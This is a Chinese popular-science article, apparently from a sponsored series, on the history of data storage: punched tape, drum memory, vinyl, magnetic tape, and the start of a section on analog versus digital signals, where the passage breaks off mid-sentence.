[{"title":"数字存储完全指南 01：储存设备的诞生与历史","date":"2021-10-09 09:23:13","description":"\n<p>这是少数派与<a href=\"https://www.aigo.com/\" target=\"_blank\">国民好物 aigo </a>联合推出的信息储存设备的科普系列文章。作为国内早期的存储设备制造商及佼佼者，感谢 aigo 对本文提供的一系列支持，包括但不限于技术知识指导、市场难寻的老物件以及作者用于拆解介绍的最新产品等。</p>\n<p>我们希望通过最简洁通俗的描述，带领大家了解信息储存设备的基本原理，知道那些复杂的参数，如何挑选购买适合自己的存储设备，又是如何更好地使用，更安全稳定地保存我们的数据，以及未来我们能够用上什么技术。 另本系列虽然与 aigo 联合发起，但所有内容不涉及任何品牌指导或要求的商业营销。</p>\n<hr>\n<p>从宇宙大爆炸开始，信息不断产生而又转瞬即逝；当某个原始人将自己被火熏黑的手掌按在岩壁上，便主动存储下了属于人类的第一份信息。人类不断增速的发展，离不开越来越成熟的信息储存读取手段以及越来越先进的存储设备，它们让我们能够稳定地继承先人的知识，储存我们大脑放不下的信息，更好地工作、娱乐、生活，并将我们这一代的成果传承给下一代。随着数字时代进入成长期，与数字信息打交道占据了我们生活越来越多的百分比，而信息的储存设备也变得越来越复杂多样。</p>\n<p>本系列文章就是为了帮助你了解信息世界的储存<strong>（亦作存储，下同）</strong>设备而生，系列将分成过去、现在、未来三部分，用大约十几篇文章，15 万字左右的篇幅，让你了解信息<strong>储存设备的基本原理</strong>，知道那些<strong>复杂的参数都是啥</strong>，<strong>如何挑选购买</strong>适合自己的存储设备，又是如何<strong>更好地使用，更安全稳定地保存我们的数据</strong>，以及未来我们能够用上什么技术。我想实现的最好的目标就是，把这个系列打造成中文区想要了解购买使用储存设备的朋友必看，而且能够毫无难度地理解并打开整个储存设备的新世界大门。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/f63c35849800ce5f3cd73eacce085692.JPG\"><figcaption>储存设备大合集</figcaption></figure><blockquote><p>提示：本系列的内容老少皆宜，其中购买与使用部分以家用和小型商业用途为基础，大家可以根据自己的用途和侧重点来看相关的部分，而不用担心某些内容太复杂或者不适合自己，看自己想要知道的就行。部分页面失效可以复制网页链接去 <a href=\"http://wayback.archive.org/\">Web Archive</a> 查看历史版本。</p></blockquote>\n<blockquote><p>感谢 aigo 爱国者为为本系列文章提供部分设备。未注释图片来源于 Unsplash 等免费图片分享网站。</p></blockquote>\n<p>好了，接下来我们即将开始正文内容，第一章我先带你来了解一下储存设备的基本历史进行热身，看看那些属于不同时代回忆的储存设备都是怎么工作的，又有哪些设备能勾起你的情怀追忆。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/41987faa5bd4dac297a984a67a58b6ba.jpg\"><figcaption>桌面上的磁带与 CD 机</figcaption></figure><h2>从远古时期开始：挑选储存介质的原则</h2>\n<p>还记得我们开头说的岩壁上的手掌印吗？人类从远古到现在，除了数字设备以外常用的储存数据介质（石头、绳子、金属、动物骨头、竹子、蚕丝、纸张等），主要储存方式基本都是<strong>刻和印</strong>，这主要是时代技术的限制，不过也能看出即使条件简陋，人们对信息保存的要求都非常类似，即使到现在也差不多，根据实际经验我们可以总结一下通常挑选储存介质的原则：</p>\n<ul><li>\n<strong>材料坚固容易保存</strong>：身处信息大爆炸时代的我们可能不会想到，在储存设备和储存方式稀少的年代，一般人只有最重要的信息才会使用介质保存下去，所以通常人们都会选择身边最结实的东西，这也导致了直到纸张和墨水出现前，很长一段时间内储存介质的修改是比较困难的。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/f796a60788ea209c2932ef7356d7d96a.jpg\"><figcaption>龟壳拓印下来的内容</figcaption></figure><ul><li>\n<strong>储存信息鲁棒性强</strong>：鲁棒性其实就是健壮性，也就是储存介质将信息储存下来之后，能否在一定条件的干扰下保持信息的完整。以前的存储介质一般都不强调要反复修改，储存信息时就宏观改变了介质的性状，加上之前的储存介质一般都比较坚固，这样其实鲁棒性相对现在的设备来讲非常好，比如石头上的刻痕可以历经风霜千万年，即使是看起来脆弱的纸张，也能保持千年不腐。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/3a01c6f2fdf94804d2045dbe65f655e8.png\"><figcaption>甘肃天水放马滩 5 号墓出土的纸地图，来源：每日甘肃</figcaption></figure><p>后来随着时代的发展，信息的类型还有形式越来越多，所以对存储设备介质的要求也越来越多：</p>\n<ul><li>\n<strong>数据容量/材料性价比高</strong>：这点自不必说，随着数字信息的使用越来越广泛，只有容量/材料性价比足够高的储存介质，才能被更多人去使用，从而促进对应存储介质的研究发展，形成良性循环。近几年随着科学技术的发展，储存介质的性价比越来越高，从我们以前讨论的每 KB （使用）成本，每 MB 成本，到现在已经可以讨论每 GB 甚至每 TB 成本，都要归功于科学技术的飞速发展。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/7b7ac78302d2d472cf33a0458d113932.png\"><figcaption>比如 aigo 爱国者这块 1T 的移动硬盘每 GB 成本只有 5 毛不到</figcaption></figure><p><strong>可以反复修改数据/修改数据的成本低</strong>：这也是现在储存介质的基本要求，毕竟信息爆炸的时代已经不像从前，重要信息一次写入介质，其他人只能通过「只读」的方式「访问」信息。比如我们整个虚拟互联网世界，都是靠这些实体的储存设备来维持数据，互联网时代每个人每天都在产生修改删除大量的信息，一个修改数据成本低的储存介质，带来的好处是显而易见的。</p>\n<p><strong>维持数据完整性的成本低</strong>：反复擦写难度越低的储存介质，一般维持数据完整性的难度都会变高，比如我们常见的声音模糊不清的磁带、关机就会丢数据的内存、年代久远的软盘没有数据等等，所以现在很多储存介质都是在反复擦写难度和保存数据完整性难度之间取一个平衡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/a698096653780c96ff71dc5fd2f7edc7.jpg\"><figcaption>512MB 的 U 盘已经没办法读取了</figcaption></figure><ul><li>\n<strong>易读取/高随机读取性能</strong>：这也是数字时代对储存介质提出的新要求，毕竟之前人类对超出自己能力的信息读取性能要求不大，同时给书本加上目录这种方法也已经能够满足人类自己的随机读取要求，而计算机的出现在某种程度上碾压了人类的大脑，而处理器的速度越来越快，我们同时也需要不断寻找能够配得上处理器速度的储存介质。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/9dd543c950a340aa5a700c16543aef08.jpg\"><figcaption>运行内存 RAM 的速度，以后可能会变成我们的储存设备</figcaption></figure><p><br>等等等等……</p>\n<p>其实储存介质的挑选原则用一句话来总结就是：<strong>便宜耐操可持续</strong>。由于时代科学技术的限制，以前的存储设备一般都只能满足小部分原则，而现在的储存设备，很多都已经能够满足上面提到的大部分原则。而除了储存介质，数据储存的方式也在不断的变化，从以前主要是实物上刻和印，到现在声、光、电、磁等多种方式应有尽有，未来甚至还能真正实现用生物的方式将信息真正「刻进 DNA 里」。</p>\n<h2>改变时代：打孔纸带出现</h2>\n<p>你或许见过网上卖的那种小玩具：一个可以换歌的八音盒，只需要插入不同的打孔纸带，就能演奏出不同的歌曲。就是这些不起眼的甚至有一些简陋的打孔纸带，却是人类迈入信息时代的一个里程碑。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/c544afee6d03cff73682907e611fa1d9.png\"><figcaption>可以换歌的八音盒</figcaption></figure><p>早在 17 世纪，第一次工业革命之前几十年的 1725 年，由于农业革命促进生产力的发展和市场的解放，人力的方式已经不能满足市场以及多种方面的需求，人们（主要是那个时候的资本家们）迫切需要让机器自己动起来。有需求自然就有人解决需求，1725 年一个纺织工人 Basile Bouchon 就天才般想到了可以把工作流程数据用打孔纸带记录，然后将纺织机的提针与一个读取结构连接，打孔纸带通过读取结构时，用纸带上有没有小孔来控制提针的提起和落下，从而实现半自动织布，这也是我们现在看到的织布机结构的最初原型。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/395310b8717584f455d4d82e2e89f045.jpg\"><figcaption>现在看起来很容易懂，当时却是非常精妙，图片来源：Deutsches Technikmuseum Berlin</figcaption></figure><p>打孔纸带出现的意义非常巨大，虽然仍然是刻印类的储存方式，它不仅是人类第一次尝试将储存读取设备应用到工业化中，这种类状态机的思路也为后来设计信息储存设备的大佬们提供了思路，比如后面出现的打孔卡片甚至磁鼓储存器等，直到后面机械硬盘出现前还广泛用于各个行业。</p>\n<p><strong>相关文献</strong>：<br>[1]. 那个年代还没有现代专利系统，要了解更多相关知识的小伙伴可以看看这篇 <a href=\"https://www.polyomino.org.uk/computer/ECMA-10/\">ECMA 打孔带数据交换标准</a></p>\n<h2>硬盘的雏形：磁鼓储存器</h2>\n<p>接下来我们看看储存设备历史上另一个重要的发明。时间跳到 1932 年，Gustav Tauschek 在奥地利发明出了现代硬盘的前身：磁鼓储存器，利用我们初中就学过的磁生电与电生磁现象巧妙地实现了对数据的储存读取。</p>\n<p>先来看一下它的结构：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/6380fb3df448a50fa9afd22a3fb0dced.png\"><figcaption>磁鼓储存器的结构</figcaption></figure><p>如果之前已经了解过机械硬盘原理的小伙伴，就会发现磁鼓储存器的原理和机械硬盘已经非常相像了。中间那一条圆柱形就是储存数据的地方，周围那一圈圈的就是很多个磁头，圆柱形的外表有一层铁磁材料，圆柱体就是磁鼓筒（相当于机械硬盘上的盘片）会不断旋转。</p>\n<p>想要读取或者写入某个数据的时候，只需要等待磁鼓筒对应区域转到对应磁头底下，<strong>磁头通过磁生电感应底下区域的磁性，或者通过不同电压改变底下区域的磁性来实现读取或写入信息。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/4c6754f02592af117cb558f00b25a80b.png\"><figcaption>看看实物的照片就更加容易理解了，原视频 Youtube@TilTuli</figcaption></figure><p>相比起之前刻和印的方式，磁鼓储存器创新性的采用了磁性的方式储存信息，比起之前的存储设备，<strong>由于磁头的顶端可以做到只有针尖般大小，磁化的区域非常小</strong>，所以整个磁鼓筒可以塞下密度非常高的数据。</p>\n<p>高密度的存储磁鼓储存器的容量来到了惊人的 <strong>62.5KB</strong>，而且由于中间磁鼓筒可以转得很快，读取速度也非常可以（型号 USSC90，磁鼓筒每秒能转 300 圈，最高能够达到 <strong>60KB/s</strong> 的读写速度，相当于一秒就能够把自己全部的容量读一遍）。对比起之前出现的储存设备，这个简直可以说是质的飞跃，能够满足科技进一步发展的需求。也是因为如此，之后大部分储存设备的原理都向光、电、磁能够精确改变微小区域的方式发展。</p>\n<p>其实，作为一项可以说是跨时代的发明，磁鼓储存器的出现其实是比较晚的，甚至晚于我们接下来介绍的磁带。这中间还有出现过水银延迟线、等其它储存设备。虽然速度很慢，容量很小，但是为人类科技发展的「飞轮效应」跨过了最初的困难。</p>\n<p><strong>相关文献</strong>：<br>[1]. 对这项改变世界的发明感兴趣的小伙伴可以阅读 Gustav Tauschek 本人 1932 年的<a href=\"https://history-computer.com/Library/US1880523.pdf\">磁鼓储存器专利</a>。</p>\n<p>[2]. 一个很有代表的磁鼓储存器型号：USSC90，这是<a href=\"http://www.ussc90.nl/drum.htm\">它的参数和原理介绍</a>。</p>\n<p>[3]. 动图截取自 Youtube@TilTuli 的视频，大家可以看看完整版，点击<a href=\"https://www.youtube.com/watch?v=eIpoA7Ir9p8&amp;t=31s\" target=\"_blank\">「1950's Early mechanical \"Direct Access\" Drum Memory Storage」</a>观看</p>\n<h2>时代的记忆：磁带与黑胶唱片</h2>\n<p>前面所介绍的储存设备，可能我们都不是非常的熟悉，甚至于我们家里的长辈也都不太熟悉。但是接下来介绍的这两个设备，那一定是很多人青春的回忆了。它们都曾经是全世界音乐最流行的载体，但最后一个变为音乐爱好者的珍宝，一个却至今仍然是商业领域热门的储存设备。</p>\n<h3>黑胶唱片</h3>\n<p>作为一个 90 后，相信同龄人和我一样，通常只能在影视剧里面看到这些顶着大喇叭的留声机和黑胶唱片机。最近怀旧风潮兴起，可能大家也会在视频网站看到一些 UP 主分享一些新式的黑胶唱片机。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/12/45fe65aa7c97bf732b48fbca92cb9ac3.jpg\"><figcaption>Victor 系列经典的造型与特色的大绿盘</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/4f2dcfc1825ae4d84ce71575a592018b.jpg\"><figcaption>唱片店里面的黑胶播放器</figcaption></figure><p>黑胶唱片作为最主要的储存介质，统治了整个 20 世纪的音乐界。留声机作为一种简单的机械设备，最初它不用插电（转盘转动的动力来自于上弦），通过震动直接将声音传导到喇叭放大发声，唱片本身也只是一个简单的塑料片，简直就是便宜耐操的典范。</p>\n<p>黑胶唱片的原理也是一个学习模拟信号基础的经典例子：</p>\n<ul><li>\n<strong>保存声音</strong>：录制机器使用各种方法（振膜传递振动等）驱动一个录音头（就相当于一个小刻刀），录音头在平滑的旋转乙烯基盘片上根据声波振动不同左右震动，刻出一道道深浅不一的同心圆凹槽，直接代表连续的声音变化，凹槽左右边的不同波浪就代表了左右声道的声音变化。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/4e5197c833e1b98544002176714f78c7.png\"><figcaption>这个录音设备一看就非常直接，图片来源 ：谷歌艺术</figcaption></figure><ul><li>\n<strong>读取声音信息</strong>：唱头上面的针用一定的压力压在唱片的特定位置上，同心圆凹槽左右两边不同的起伏，会让整个唱臂左右摇摆不同的幅度，唱臂里面的电磁铁就会产生不同的电流，放大器放大声音信号并驱动喇叭发出声音。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/1473309c3109afb6f4c7f128c4f643b7.png\"><figcaption>显微镜可以看到唱针是怎么通过凹槽读取声音的</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/82450fb98d998629142d927a6de1a2bb.gif\"><figcaption>来个动图，图片来源：Youtube@Applied Science</figcaption></figure><p>就是这么简单直接的一个模拟信息保存传输方式，让音乐不再是贵族们的私人专享，普罗大众从此也能够享受到音乐的愉悦，促进了流行音乐的发展，无数经典的歌曲通过黑胶唱片永久保存下来，让 21 世纪的我们也能够听到 20 世纪的天籁之音。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/dfe526cf0f8a15c02cffb9630ff41649.jpg\"><figcaption>经典专辑的黑胶唱片</figcaption></figure><p>经过多年发展，黑胶唱片的材质，尺寸和录音读取方式越来越多样，音频质量也在不断提高，甚至索尼与铁三角等厂家还生产并不断更新数字黑胶播放器。直到现在，很多歌手也会为自己的专辑出一张黑胶唱片用作纪念，同时黑胶唱片仍然被部分音乐爱好者追捧（最近美国销量甚至超越 CD，2021.06，MRC Data），折腾不同的设备和唱针就是为了追求那充满时代特色的温暖声音和爆豆声。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/23efeaf02d11f90580542e5660ff0490.jpeg\"><figcaption>索尼的数字黑胶播放器</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/d5bd7d8885a8e96ccd6395322886ded9.jpg\"><figcaption>周杰伦的专辑黑胶版</figcaption></figure><p><strong>相关文献</strong>：<br>[1]. 对黑胶感兴趣的小伙伴一定要搜搜看德意志留声机公司（DG），世界上最大的古典音乐唱片品牌，目前是在环球音乐旗下。它的创始人 Emile Berliner 就是第一个发明声音记录方法和最初唱片的巨佬，可以上<a href=\"https://www.deutschegrammophon.com/en\">官网</a>买一张正版黑胶纪念一下。</p>\n<p>[2]. Emile Berliner 发明的留声机结构，可以查看他自己在 1900 年发表的<a href=\"https://patents.google.com/patent/US692502A/en\">留声机专利</a>。</p>\n<p>[3]. 最早的留声机结构可以看一下 Tomas A Edison（没错，就是那个爱迪生）<a href=\"https://patents.google.com/patent/US200521A/en\">1878 年的留声机专利</a>。</p>\n<p>[4]. 文章黑胶唱片机原理图部分引用自 V.H.Emerson 1916 年的<a href=\"https://patents.google.com/patent/US1345756A/en\">专利</a>。</p>\n<p>[5]. 动图截取自 Youtube@Applied Science 的视频，大家可以看看完整版<a href=\"https://www.youtube.com/watch?v=GuCdsyCWmt8\">《Electron microscope slow-motion video of vinyl LP》</a>。</p>\n<h3>磁带</h3>\n<p>相比起黑胶唱片机，磁带与中国人结下的不解之缘更加深，我们爸妈那会儿年轻的时候，买到最新的磁带，然后在房间里偷偷享受属于自己的小世界，或者和朋友一起讨论交换最新的歌曲磁带，怕是普通人最潮最常见的娱乐方式了。有钱人甚至能弄一台最新的索尼 Walkman，成为街上回头率百分百的 GGMM。无论是打孔带还是自己灌录，磁带以及它所承载的音乐成为很多人青春回忆里的重要背景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/72a4cb0018a3181d55adc7fe3f4e5f53.jpg\"><figcaption>经典的 Walkman 与磁带</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/91fca407b58357d423b4aeba175ee166.jpg\"><figcaption>经典的磁带歌曲</figcaption></figure><p>即使是我们这一代人，小时候其实都有被学英语磁带支配的酸爽。不过就跟学习机最后大部分沦为游戏机一样，磁带机最后大概率会变成播放器。</p>\n<p>那个时候比较经典的磁带怕就是 TDK C60（C+数字 指两面合起来能够录制这么多分钟，C60 也就是每面 30 分钟） 磁带了，不仅能录制最高一个小时（根据机器转速不同实际 35-45 分钟）的音乐，还把「高保真」这一个关键词带进了大众视野，甚至能够录制多声道的立体声。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/5b135d0185d04bb582e041f4a1f79e70.jpg\"><figcaption>TDK 磁带</figcaption></figure><p>其实磁带的声音和黑胶有点像，因为它们的原理其实都是录制模拟信号，所以前期或者便宜的磁带出来的声音会有点失真和沙沙声。而且大家估计想不到除了我们常用的听歌用途外，<strong>磁带还是非常方便和广泛使用的通用储存设备，即使到了现在磁带依然在商业领域被广泛使用。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/63d61f4b29475051127888d767f95bee.png\"><figcaption>IBM 的商用磁带备份机</figcaption></figure><h3>磁带的原理</h3>\n<p>磁带其实就是一条上面涂上可以被磁化的氧化物材料（通常是氧化铁）的塑料带，平时我们看到它卷起来只是为了减少储存体积的一种方式。再结合我们初中学到的磁生电与电生磁现象就能很清楚地理解磁带的原理：</p>\n<p><strong>储存数据</strong>：磁带上方固定一个磁头，磁头与磁带接触，用滚轮等方式将磁带以固定速度从磁头下方滚过。磁头接收发过来的不同电压数据脉冲（比如麦克风记录到的声音变化，数字磁带机直接发送 0 和 1 ），利用电生磁现象就会产生方向不一样的磁场，那么底下通过接触这部分磁带上的材料被永久磁化的磁场方向也不同，就记录上了数据。</p>\n<p><strong>读取数据</strong>：读取的原理也和储存类似，不过利用的是磁生电现象，不同的磁场通过磁头会产生不同的电流，磁头就可以将这些电流数据交给其它的部分（比如扬声器发声），实现数据的读取。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/f39d9ab86184fec9950a0399d3bd3f09.png\"><figcaption>磁带的原理示意图，图片来源：TDK 和 IITK</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/ea63e487ba57966bf804ea17aa0ba0c1.jpg\"><figcaption>磁带的结构</figcaption></figure><p>磁头一般很小，所以数据密度可以很大，同时如果在一个宽度的磁带上，做两个 1/2 的宽度的磁头甚至更多个磁头，就可以实现多轨记录和读取（比如磁带录音带的立体声）。</p>\n<p>看到这里大家是不是觉得有点眼熟，没错它和磁鼓储存器的实现思路有点相像，事实上所有以「电磁」方式来储存数据的设备都差不多是这种思路。</p>\n<h3>录像带与其它磁带</h3>\n<p>我们之前比较少见到的录像带，其实也是一种磁带。不过由于视频数据量和带宽都比较高，录像带一般会做得比较大比较宽，宽度长度大约和胶片差不多，用多个轨道来分别记录红、绿、蓝三个像素信息、同步信息和音频的模拟信号。读取时候旋转的也比较快，而且磁头是螺旋形扫描的。</p>\n<p>除了储存音乐，标准的磁带还曾经被储存各种各样奇怪的东西，比如程序，文本和游戏，只需要一台磁带机就能在电脑上读出数据。在曾经软驱比电脑还贵的那个年代（甚至有厂家直接把电脑塞进软驱），用磁带来储存数据是一个便宜好用的方法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/94f12b6f549e6a03bc3b14f76b285f42.jpg\"><figcaption>游戏和录像带</figcaption></figure><p>了解了原理后，我们也不难知道磁带的优点和它为什么会这么普遍使用了：首先磁带用一种很巧妙的方法让保存材料可以变得很轻薄，加上软性材料可以用特殊的方法收纳（比如卷起来），所以磁带可以<strong>在轻、薄、小的同时实现大容量的储存</strong>还能节省材料。</p>\n<p>写入读取结构简单也可以让磁带与磁带机也变得便宜，既可以录入模拟信息，也可以录入数字信息，<strong>同一台机器就可以实现录制还有播放</strong>，通过使用高转速和更加坚固的材料，还可以实现飞快的顺序读取写入速度。另外写入数据是永久改变材料上的磁性，磁带的数据稳定性很不错，只要保存得当，理论上应该能够保存几十上百年。</p>\n<p>所以磁带迅速风靡全球，在很多发展中国家甚至是主要的储存设备（比如很多国家的演讲都是通过磁带翻录传递到民众中）。<s>另一方面也让最早的盗版盗录产业得以发展</s>。</p>\n<p>当然磁带的原理导致它也是有缺陷的，其中最重要的就是<strong>基本只能顺序读取，随机读取能力差到忽略不计</strong>。相信用过磁带的小伙伴都有过想听磁带里面的某一首歌，然后在那边干等它转啊转的经验，特别是想听倒数第二首歌的时候那感觉真是特别煎熬，更别说随机播放了，基本不存在的。</p>\n<p>除了这个比较大的缺陷磁带还有每台设备转速不一样导致声音不一样，转太快崩太紧容易断，磁带磁带机上（俗称吃磁带），用不是空的磁带录制由于磁性改变不彻底会出现声音重复等。</p>\n<p>那么为什么现在磁带仍然是企业冷备份的优先选择呢？</p>\n<p>主要是<strong>LTO 磁带在实现大容量的同时是真的便宜（0.04 元/GB，30TB 只要 2000 不到）</strong>，体积还蛮小的，而且只需要简单地增加磁带数量就能够增加容量，大规模数据物理转移的时候磁带的稳定性也比硬盘高很多。而且磁带机通过特殊的驱动也能够避免勒索软件或者病毒修改数据。用来储存一些基本不用的冷数据（比如你 10 年前的银行账单或者各种完成的项目存档）简直完美。</p>\n<p>所以磁带今天仍然是冷备份的优先选择，像是我们常用的支付宝微信支付等金融数据，都是会稳稳地用磁带保存一份冷备份在地下的，<s>就不用担心服务器全部爆炸，自己的余额都不见了</s>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/00e47ab12b7edaa5f21f45b31534d52f.gif\"><figcaption>企业备份的磁带库</figcaption></figure><p><strong>相关文献</strong>：</p>\n<p>[1]. 常见磁带和磁带机的结构可以参考这份<a href=\"https://patents.google.com/patent/US4365277A/en\">磁带机的专利</a>。</p>\n<p>[2]. 想折腾磁带冷备份的小伙伴可以看一下这份<a href=\"https://www.saac.gov.cn/daj/hybz/201912/1b944990fa1b4d829ac4ca4315ac65d3/files/3eb7a3f6fa434bd9b88483735cee24a1.pdf\">《中华人民共和国档案行业标准：档案数据存储用 LTO 磁带应用规范》</a>。</p>\n<p>[3]. 想看看各种商用储存机长什么样的小伙伴,可以去 IBM 提供的各种 <a href=\"https://www.ibm.com/demos/it-infrastructure/product.html\">3D 产品演示</a>。</p>\n<h3>磁带和黑胶唱片的沙沙声爆豆声是怎么来的</h3>\n<p>如果你听过磁带和黑胶唱片的声音，那么你一定会对沙沙作响的背景声音和爆豆声印象深刻。甚至最近 lo-FI 音乐开始复苏，就是制作音乐的时候主动往音频文件里面加入这些背景声音和爆豆声的采样（所以说时尚是一个圈），那么这些声音都是怎么来的呢？</p>\n<p>对于黑胶唱片来讲，<strong>这些声音主要是来自于唱片的缺陷和表面的灰尘</strong>。以前唱片在压制条件不会很好（没有真空，唱片不干净之类的），导致刻刀没法把声音正确刻在那个部分，播放的时候就会导致失真。同时我们用的唱片机一般唱片直接暴露在空气中，播放时掉落的灰尘会阻止唱针读取到轨道上的音乐信息，从而让音乐失真一瞬间，这就是爆豆声。</p>\n<p>所以当我们小心清理好唱片并用防尘罩盖好播放，会发现爆豆声直接少了大半，甚至<strong>如果你直接用上真空播放器，会发现黑胶唱片的声音也能如数字 CD 般顺滑</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/b572394bb104afe481e31d4733c1897f.png\"><figcaption>擦拭前后的声波对比，图片来源 Youtube@<br>Vinyl for Miles</figcaption></figure><p><br>原视频 Youtube@Vinyl for Miles：<a href=\"https://www.youtube.com/watch?v=fB17BRtqeJQ&amp;t=608s\">「Vinyl Vac Full Review - Before and After Audio Comparison!」</a></p>\n<p>而磁带背景的沙沙声就有点高大上了（排除电路噪声），是<strong>各种来源「不规矩」的磁粒子产生的随机电信号</strong>。它们可以是空气中的粒子，可以是磁头精度不够漏掉的粒子，也可以是磁带生产中的磁离子颗粒太粗了……</p>\n<p>提高生产精度和磁粒子的密集程度，或者增加磁带的宽度（增加带宽提高信噪比）都可以减少这种背景噪声提高声音纯净度，那个时候各家磁带厂家宣传的「高保真」就是这个意思。</p>\n<h2>数字信息（信号）和模拟信息（信号）</h2>\n<p><strong>接下来出现的就是数字时代的设备了，在数字信息出现之前，磁带和黑胶唱片是典型的储存模拟信息的介质</strong>。那什么是模拟和数字信息（包括信号，下同），为什么我们现在都是用数字信息，它有什么优势？</p>\n<h3>模拟信息</h3>\n<p>我们生活在一个现实世界，<strong>很多信息是无限连续的</strong>，比如我们听到的声音、我们看到的风景、电压电流的变化……如果你把它们细分开来，你会发现它们无穷无尽。所以早期人们如果想通过设备处理和储存这些信息，就必须用另一种可以无限连续的介质去代表它，甚至汽车上的转速表、游戏机上的手柄等都是显示传递模拟信息的例子，所以在存储设备上模拟信息就是<strong>用可储存的机械量的连续改变，模拟不可储存信息的连续变化</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/09f5404a7ff14387bf86ef02d2f122ba.png\"><figcaption>模拟信息用电压表示应该是平滑的曲线，没有任何离散值变化</figcaption></figure><p>比如黑胶唱片的轨道和磁带上的磁颗粒信息都是连续的，<strong>我们能够在上面取到无限的值</strong>，而且在每一瞬间它都会有一个确定的值。</p>\n<p>模拟信息的特性让它的优点和缺点都非常明显。</p>\n<p>优点有：</p>\n<ul>\n<li>\n<strong>信息密度和精细度非常高</strong>，毕竟是无限的值。</li>\n<li>\n<strong>非常适合用来记录表示现实世界的变化</strong>，比如最常用到的电压电流、声音、温度、速度等。</li>\n<li>\n<strong>读取和保存都非常容易</strong>，像是磁带黑胶唱片它们的原理其实都非常直观，直接采用宏观的方式就可以写入读取。</li>\n<li>\n<strong>对传输要求比较低</strong>，使用很少的带宽就可以传输相对丰富的信息，像是我们之前的有线电视很多年来都是模拟信号。</li>\n</ul>\n<p>但它的缺点催生出了人们现在主要使用的数字信号：</p>\n<ul>\n<li>\n<strong>很容易受到噪声影响</strong>，<strong>噪声指的是与我们想要处理的信息无关的信息</strong>，由于精度、干扰等问题，在模拟信息中噪音基本不可避免，信噪比（xx dB）这个单位就是用来形容信息/噪声的比例，大于 1dB 代表信息比噪声多，所以这个数字越大越好。</li>\n<li>\n<strong>容易产生损耗和干扰</strong>，现实世界不存在绝对稳定的介质，无论是有线还是无线传输和储存，随着距离和时间的增加，模拟信息里面的噪声一定是会越来越多的，这就是我们常说的损耗和干扰。如果因为功率密度等原因保存传输的信息读取时需要放大，那信息的完整性就更差了，因为<strong>放大信息的同时也会放大噪声</strong>。</li>\n<li>\n<strong>与数字设备的工作原理相斥</strong>，这个会在下面介绍数字信号时讲到。</li>\n</ul>\n<p>我们上面说到的沙沙声和爆豆声，其实就是各种意义上的噪声，模拟信号里面的电压电流也会产生噪声，这破坏了信息的完整性与准确性。<strong>最重点的是这些噪声的来源太随机了</strong>，电路里面一个不稳定的电压，空气中的灰尘，不同的材料甚至今天天气的温湿度、不同的宇宙辐射强度，都会让不同设备处理同一段模拟信息时产生不同的结果，比如你小时候在家看西游记，电视上的雪花和邻居是不一样的，<s>所以严格来讲，你和邻居看的是不一样的西游记</s>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/de46aa32aa314363d4b98aaadff7a749.jpg\"><figcaption>充满噪点的电视</figcaption></figure><p>噪声越多保存传输的数据越难读取恢复，如果低信噪比的数据来进行科学计算，结果甚至会是反的。随着时代发展人们对于传输速度和准确性的要求越来越高，模拟信号在大部分领域都是无法让人接受的。</p>\n<h3>数字信息</h3>\n<p>模拟信号的缺点和更高效新设备的出现，促进了数字信号的诞生。我们都知道计算机里面处理和储存的都是 0 和 1 的<strong>有限数据</strong>，这是由处理器晶体管组成的逻辑门物理特性决定的，这代表它们基本没办法处理储存无限连续数据。举个简单的例子，各家编程语言里面都有提供圆周率 兀 作为常数变量，而如果你查看底层代码就会发现，它们都是直接预设一个几十位精度的 兀 